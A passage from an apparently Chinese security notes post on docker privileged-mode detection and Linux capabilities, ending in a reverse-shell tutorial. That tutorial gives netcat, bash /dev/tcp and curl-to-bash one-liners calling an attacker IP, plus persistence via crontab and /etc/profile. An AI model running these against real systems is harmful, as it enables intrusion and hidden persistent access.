class="line">7:blkio:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">6:cpuacct,cpu:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">5:pids:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">4:perf_event:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">3:memory:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">2:net_prio,net_cls:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">1:name=systemd:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br></pre></td></tr></table></figure>
<h3 id="5特权模式判断"><a class="markdownIt-Anchor" href="#5特权模式判断">#</a> 5. 特权模式判断</h3>
<p>可通过 cat /proc/self/status |grep Cap 命令判断当前容器是否通过特权模式起（000000xfffffffff 代表为特权模式起）</p>
<p>常见的有 <code>0000001fffffffff</code> ， <code>0000003fffffffff</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos ~]# docker run -it --privileged ubuntu:18.04  </span><br><span class="line">root@8ed8accc6562:/# cat /proc/self/status | grep Cap</span><br><span class="line">CapInh:	0000001fffffffff</span><br><span class="line">CapPrm:	0000001fffffffff</span><br><span class="line">CapEff:	0000001fffffffff</span><br><span class="line">CapBnd:	0000001fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos ~]# docker run -it ubuntu:18.04  </span><br><span class="line">root@980122e5f1f2:/# cat /proc/self/status |grep Cap</span><br><span class="line">CapInh:	00000000a80425fb</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos ~]# capsh --decode=0000001fffffffff</span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class="line">[root@VM-16-11-centos ~]# capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37</span><br></pre></td></tr></table></figure>
<p>通过 capsh 查看当前 shell 的 capabilities，0000001 和 0000003 权限只相差 <code>37</code></p>
<h3 id="6linux-capabilities-补充"><a class="markdownIt-Anchor" href="#6linux-capabilities-补充">#</a> 6.Linux Capabilities （补充）</h3>
<p>root 是 linux 中的最高权限，可以安装软件、允许某些服务、管理用户等。作为普通用户，如果想执行某些只有管理员才有权限的操作，以前只有两种办法：一是通过  <code>sudo</code>  提升权限，如果用户很多，配置管理和权限控制会很麻烦；二是通过 SUID（Set User ID on execution）来实现，它可以让普通用户允许一个  <code>owner</code>  为 root 的可执行文件时具有 root 的权限。</p>
<p>通过  <code>sudo</code>  提升权限，如果用户很多，配置管理和权限控制会很麻烦，我们需要修改 sudo 的配置文件 <code>/etc/sudoers</code> ；而使用 SUID 时，通常只是需要很小一部分的特权，但是  <code>SUID</code>  给了它 root 具有的全部权限。这些可执行文件是黑客的主要目标，如果他们发现了其中的漏洞，就很容易利用它来进行安全攻击。</p>
<p>为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫  <code>capabilities</code> 。</p>
<p>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的 root 特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时，操作系统会检查 cap_effective 的对应位是否有效，而不再是检查进程的有效 UID 是否为 0。</p>
<p><code>Capabilities</code>  机制是在 Linux 内核  <code>2.2</code>  之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>
<p>Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了  <code>CAP_NET_BIND_SERVICE</code>  capabilities，那么它就能以普通用户运行并监听在 80 端口上。同时 nginx 父进程会根据配置文件启动 worker，因此 nginx 运行时需要 inheritable 的权限</p>
<table>
<thead>
<tr>
<th style="text-align:left">apability 名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">CAP_AUDIT_CONTROL</td>
<td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
</tr>
<tr>
<td style="text-align:left">CAP_AUDIT_READ</td>
<td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td>
</tr>
<tr>
<td style="text-align:left">CAP_AUDIT_WRITE</td>
<td style="text-align:left">将记录写入内核审计日志</td>
</tr>
<tr>
<td style="text-align:left">CAP_BLOCK_SUSPEND</td>
<td style="text-align:left">使用可以阻止系统挂起的特性</td>
</tr>
<tr>
<td style="text-align:left">CAP_CHOWN</td>
<td style="text-align:left">修改文件所有者的权限</td>
</tr>
<tr>
<td style="text-align:left">CAP_DAC_OVERRIDE</td>
<td style="text-align:left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td style="text-align:left">CAP_DAC_READ_SEARCH</td>
<td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td>
</tr>
<tr>
<td style="text-align:left">CAP_FOWNER</td>
<td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
</tr>
<tr>
<td style="text-align:left">CAP_FSETID</td>
<td style="text-align:left">允许设置文件的 setuid 位</td>
</tr>
<tr>
<td style="text-align:left">CAP_IPC_LOCK</td>
<td style="text-align:left">允许锁定共享内存片段</td>
</tr>
<tr>
<td style="text-align:left">CAP_IPC_OWNER</td>
<td style="text-align:left">忽略 IPC 所有权检查</td>
</tr>
<tr>
<td style="text-align:left">CAP_KILL</td>
<td style="text-align:left">允许对不属于自己的进程发送信号</td>
</tr>
<tr>
<td style="text-align:left">CAP_LEASE</td>
<td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td>
</tr>
<tr>
<td style="text-align:left">CAP_LINUX_IMMUTABLE</td>
<td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
</tr>
<tr>
<td style="text-align:left">CAP_MAC_ADMIN</td>
<td style="text-align:left">允许 MAC 配置或状态更改</td>
</tr>
<tr>
<td style="text-align:left">CAP_MAC_OVERRIDE</td>
<td style="text-align:left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td style="text-align:left">CAP_MKNOD</td>
<td style="text-align:left">允许使用 mknod () 系统调用</td>
</tr>
<tr>
<td style="text-align:left">CAP_NET_ADMIN</td>
<td style="text-align:left">允许执行网络管理任务</td>
</tr>
<tr>
<td style="text-align:left">CAP_NET_BIND_SERVICE</td>
<td style="text-align:left">允许绑定到小于 1024 的端口</td>
</tr>
<tr>
<td style="text-align:left">CAP_NET_BROADCAST</td>
<td style="text-align:left">允许网络广播和多播访问</td>
</tr>
<tr>
<td style="text-align:left">CAP_NET_RAW</td>
<td style="text-align:left">允许使用原始套接字</td>
</tr>
<tr>
<td style="text-align:left">CAP_SETGID</td>
<td style="text-align:left">允许改变进程的 GID</td>
</tr>
<tr>
<td style="text-align:left">CAP_SETFCAP</td>
<td style="text-align:left">允许为文件设置任意的 capabilities</td>
</tr>
<tr>
<td style="text-align:left">CAP_SETPCAP</td>
<td style="text-align:left">参考 capabilities man page</td>
</tr>
<tr>
<td style="text-align:left">CAP_SETUID</td>
<td style="text-align:left">允许改变进程的 UID</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_ADMIN</td>
<td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_BOOT</td>
<td style="text-align:left">允许重新启动系统</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_CHROOT</td>
<td style="text-align:left">允许使用 chroot () 系统调用</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_MODULE</td>
<td style="text-align:left">允许插入和删除内核模块</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_NICE</td>
<td style="text-align:left">允许提升优先级及设置其他进程的优先级</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_PACCT</td>
<td style="text-align:left">允许执行进程的 BSD 式审计</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_PTRACE</td>
<td style="text-align:left">允许跟踪任何进程</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_RAWIO</td>
<td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_RESOURCE</td>
<td style="text-align:left">忽略资源限制</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_TIME</td>
<td style="text-align:left">允许改变系统时钟</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYS_TTY_CONFIG</td>
<td style="text-align:left">允许配置 TTY 设备</td>
</tr>
<tr>
<td style="text-align:left">CAP_SYSLOG</td>
<td style="text-align:left">允许使用 syslog () 系统调用</td>
</tr>
<tr>
<td style="text-align:left">CAP_WAKE_ALARM</td>
<td style="text-align:left">允许触发一些能唤醒系统的东西 (比如 CLOCK_BOOTTIME_ALARM 计时器)</td>
</tr>
</tbody>
</table>
<p>docker 逃逸一般是因为 <code>cap_sys_module</code>  或者 <code>CAP_SYS_ADMIN</code>  权限的问题</p>
<p><strong>capabilities 的赋予和继承</strong></p>
<p>Linux capabilities 分为进程 capabilities 和文件 capabilities。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。</p>
<p>每一个线程，具有 5 个 capabilities 集合，每一个集合使用  <code>64</code>  位掩码来表示，显示为  <code>16</code>  进制格式。这 5 个 capabilities 集合分别是：</p>
<ul>
<li>Permitted</li>
<li>Effective</li>
<li>Inheritable</li>
<li>Bounding</li>
<li>Ambient</li>
</ul>
<p><strong>Permitted</strong></p>
<p>定义了线程能够使用的 capabilities 的上限。线程添加或删除 capability，前提是添加或删除的 capability 必须包含在  <code>Permitted</code>  集合中</p>
<p><strong>Effective</strong></p>
<p>内核检查线程是否可以进行特权操作时，检查的对象便是  <code>Effective</code>  集合。如之前所说， <code>Permitted</code>  集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。</p>
<p><strong>Inheritable</strong></p>
<p>当执行 <code>exec()</code>  系统调用时，能够被新的可执行文件继承的 capabilities，被包含在  <code>Inheritable</code>  集合中。</p>
<p>Bounding 和 Ambient 不在赘述，用的不多，可以去下面的参考链接了解</p>
<p>文件的 capabilities</p>
<p>文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有  <code>CAP_SETFCAP</code>  的 capability。</p>
<p>类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：</p>
<ul>
<li>Permitted</li>
<li>Inheritable</li>
<li>Effective</li>
</ul>
<p>最后举个 docker 的例子，在开始的时候提过 nginx 的特殊性</p>
<p>使用普通用户启动时会报以下错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind() to 0.0.0.0:80 failed (13: Permission denied)</span><br></pre></td></tr></table></figure>
<p>因为 nginx 进程的  <code>Effective</code>  集合中不包含  <code>CAP_NET_BIND_SERVICE</code>  capability，且不具有 <strong>capabilities 意识</strong>（普通用户），所以启动失败。要想启动成功，至少需要将该 capability 添加到 nginx 文件的  <code>Inheritable</code>  集合中，同时开启 Effective 标志位，并且在 Kubernetes Pod 的部署清单中的 securityContext --&gt; capabilities 字段下面添加  <code>NET_BIND_SERVICE</code> （这个 capability 会被添加到 nginx 进程的  <code>Bounding</code>  集合中），最后还要将 capability 添加到 nginx 文件的  <code>Permitted</code>  集合中。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTI5MzQy">Linux Capabilities 入门：让普通进程获得 root 的洪荒之力 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>
<p>Linux 系统中主要提供了两种工具来管理 capabilities： <code>libcap</code>  和  <code>libcap-ng</code> 。 <code>libcap</code>  提供了  <code>getcap</code>  和  <code>setcap</code>  两个命令来分别查看和设置文件的 capabilities，同时还提供了  <code>capsh</code>  来查看当前 shell 进程的 capabilities。 <code>libcap-ng</code>  更易于使用，使用同一个命令  <code>filecap</code>  来查看和设置 capabilities。</p>
<p>1.libcap</p>
<p>// 安装 libcap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y libcap</span><br></pre></td></tr></table></figure>
<p>如果想查看当前 shell 进程的 capabilities，可以用  <code>capsh</code>  命令。下面是 CentOS 系统中的 root 用户执行  <code>capsh</code>  的输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hecs-346515 ~]# capsh --print</span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep</span><br><span class="line">Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36</span><br><span class="line">Securebits: 00/0x0/1&#x27;b0</span><br><span class="line"> secure-noroot: no (unlocked)</span><br><span class="line"> secure-no-suid-fixup: no (unlocked)</span><br><span class="line"> secure-keep-caps: no (unlocked)</span><br><span class="line">uid=0(root)</span><br><span class="line">gid=0(root)</span><br><span class="line">groups=0(root)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong>Current</strong> : 表示当前 shell 进程的 Effective capabilities 和 Permitted capabilities。可以包含多个分组，每一个分组的表示形式为  <code>capability[,capability…]+(e|i|p)</code> ，其中  <code>e</code>  表示 effective， <code>i</code>  表示 inheritable， <code>p</code>  表示 permitted。不同的分组之间通过空格隔开，例如： <code>Current: = cap_sys_chroot+ep cap_net_bind_service+eip</code> 。再举一个例子， <code>cap_net_bind_service+e cap_net_bind_service+ip</code>  和  <code>cap_net_bind_service+eip</code>  等价。</li>
<li><strong>Bounding set</strong> : 这里仅仅表示 Bounding 集合中的 capabilities，不包括其他集合，所以分组的末尾不用加上  <code>+...</code>  。</li>
</ul>
</blockquote>
<p>这个命令输出的信息比较有限，完整的信息可以查看 /proc 文件系统，比如当前 shell 进程就可以查看  <code>/proc/$$/status</code> 。其中一个重要的状态就是  <code>NoNewPrivs</code> ，可以通过以下命令查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">[root@hecs-346515 ~]# cat /proc/$$/status </span><br><span class="line">Name:	bash</span><br><span class="line">Umask:	0022</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	15482</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	15482</span><br><span class="line">PPid:	15480</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	0	0	0	0</span><br><span class="line">Gid:	0	0	0	0</span><br><span class="line">FDSize:	256</span><br><span class="line">Groups:	0 </span><br><span class="line">VmPeak:	  115548 kB</span><br><span class="line">VmSize:	  115548 kB</span><br><span class="line">VmLck:	       0 kB</span><br><span class="line">VmPin:	       0 kB</span><br><span class="line">VmHWM:	    2096 kB</span><br><span class="line">VmRSS:	    2096 kB</span><br><span class="line">RssAnon:	     432 kB</span><br><span class="line">RssFile:	    1664 kB</span><br><span class="line">RssShmem:	       0 kB</span><br><span class="line">VmData:	     368 kB</span><br><span class="line">VmStk:	     132 kB</span><br><span class="line">VmExe:	     888 kB</span><br><span class="line">VmLib:	    2148 kB</span><br><span class="line">VmPTE:	      52 kB</span><br><span class="line">VmSwap:	       0 kB</span><br><span class="line">Threads:	1</span><br><span class="line">SigQ:	0/7268</span><br><span class="line">SigPnd:	0000000000000000</span><br><span class="line">ShdPnd:	0000000000000000</span><br><span class="line">SigBlk:	0000000000010000</span><br><span class="line">SigIgn:	0000000000384004</span><br><span class="line">SigCgt:	000000004b813efb</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000001fffffffff</span><br><span class="line">CapEff:	0000001fffffffff</span><br><span class="line">CapBnd:	0000001fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">NoNewPrivs:	0</span><br><span class="line">Seccomp:	0</span><br><span class="line">Speculation_Store_Bypass:	thread vulnerable</span><br><span class="line">Cpus_allowed:	1</span><br><span class="line">Cpus_allowed_list:	0</span><br><span class="line">Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001</span><br><span class="line">Mems_allowed_list:	0</span><br><span class="line">voluntary_ctxt_switches:	90</span><br><span class="line">nonvoluntary_ctxt_switches:	0</span><br></pre></td></tr></table></figure>
<p>自从 Linux 4.10 开始， <code>/proc/[pid]/status</code>  中的  <code>NoNewPrivs</code>  值表示了线程的  <code>no_new_privs</code>  属性。</p>
<p>一般情况下， <code>execve()</code>  系统调用能够赋予新启动的进程其父进程没有的权限，最常见的例子就是通过  <code>setuid</code>  和  <code>setgid</code>  来设置程序进程的 uid 和 gid 以及文件的访问权限。</p>
<p>开启了  <code>no_new_privs</code>  之后，execve 函数可以确保所有操作都必须调用  <code>execve()</code>  判断并赋予权限后才能被执行。这就确保了线程及子线程都无法获得额外的权限，因为无法执行 setuid 和 setgid，也不能设置文件的权限。</p>
<p>一旦当前线程的  <code>no_new_privs</code>  被置位后，不论通过 fork，clone 或 execve 生成的子线程都无法将该位清零。</p>
<p>Docker 中可以通过参数  <code>--security-opt</code>  来开启  <code>no_new_privs</code>  属性，例如： <code>docker run --security-opt=no_new_privs busybox</code> 。</p>
<p>2.libcap-ng</p>
<p>// 安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install libcap-ng-utils</span><br></pre></td></tr></table></figure>
<p>libcap-ng 使用  <code>filecap</code>  命令来管理文件的 capabilities。</p>
<p>查看文件的 capabilities：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/file</span><br></pre></td></tr></table></figure>
<p>递归查看某个目录下所有文件的 capabilities：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ filecap /full/path/to/dir</span><br></pre></td></tr></table></figure>
<p>[Linux Capabilities 入门教程：基础实战篇 - 菜鸟教程 | <span class="exturl" data-url="aHR0cDovL0Jvb3RXaWtpLmNvbQ==">BootWiki.com</span>](<span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9vdHdpa2kuY29tL25vdGUvMjA4MDAuaHRtbCM6fjp0ZXh0PSUyNA==">https://www.bootwiki.com/note/20800.html#:~:text=%24</span> yum install -y libcap 如果想查看当前 shell 进程的，命令。 下面是 CentOS 系统中的 root 用户执行 capsh 的输出：)</p>
<h3 id="7反弹shell补充"><a class="markdownIt-Anchor" href="#7反弹shell补充">#</a> 7. 反弹 shell (补充)</h3>
<p>反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
<p>反弹 shell 通常适用于如下几种情况：</p>
<blockquote>
<p>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</p>
<p>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</p>
<p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</p>
</blockquote>
<p>1.<strong> 利用 netcat 反弹 shell</strong></p>
<p>Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean</span><br></pre></td></tr></table></figure>
<p>攻击机开启本地监听：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
<p>目标机主动连接攻击机：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># nc &lt;攻击机<span class="variable constant_">IP</span>&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br><span class="line">netcat <span class="number">47.</span>xxx.<span class="property">xxx</span><span class="number">.72</span> <span class="number">2333</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201172931760.png" alt="image-20221201172931760"></p>
<p><strong>2. 利用 Bash 反弹 shell</strong></p>
<p>使用 bash 结合重定向方法的一句话，具体命令如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/攻击机<span class="variable constant_">IP</span>/攻击机端口 <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">47.</span>xxx.<span class="property">xxx</span><span class="number">.72</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173007852.png" alt="image-20221201173007852"></p>
<p>Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201173131974.png" alt="image-20221201173131974"></p>
<p><strong>3.Curl 配合 Bash 反弹 shell</strong></p>
<p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>并开启 2333 端口的监听。</p>
<p>然后再目标机上执行如下，即可反弹 shell：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="number">47.</span>xxx.<span class="property">xxx</span><span class="number">.72</span>|bash</span><br></pre></td></tr></table></figure>
<p><strong>4. 将反弹 shell 的命令写入定时任务</strong></p>
<p>我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹 shell 命令是要写在  <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code>  内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><strong>5. 将反弹 shell 的命令写入 /etc/profile 文件</strong></p>
<p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;  # 最后面那个&amp;为的是防止管理员无法输入命令</span><br></pre></td></tr></table></figure>
<p><strong>6. 利用 Socat 反弹 shell</strong></p>
<p>Socat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做 netcat 的加强版</p>
<p>攻击机开启本地监听：</p>
